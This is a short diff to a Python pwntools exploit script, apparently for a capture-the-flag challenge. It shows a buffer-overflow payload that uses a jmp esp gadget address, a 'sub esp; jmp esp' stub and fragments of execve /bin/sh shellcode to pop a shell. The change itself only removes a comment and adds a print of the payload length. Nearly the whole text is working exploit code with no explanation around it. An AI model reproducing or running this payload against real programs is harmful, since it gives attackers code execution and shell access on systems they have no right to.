@@ -21,7 +21,6 @@ p.recvuntil("What's your name?\n")
 
 # Gadget
 jmp_esp = 0x08048504
-# jmp_esp = asm("jmp esp")
 sub_esp_jmp = asm('sub esp, 0x28 ; jmp esp') # sub esp, 40 ; jmp esp
 
 # Shellcode
@@ -32,6 +31,8 @@ shellcode += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 payload = shellcode.ljust(36, "A")
 payload += flat([jmp_esp])
 payload += sub_esp_jmp
+
+print "Total input", 36+len(flat([jmp_esp]))+len(sub_esp_jmp), "char\n"
 
 p.sendline(payload)
 
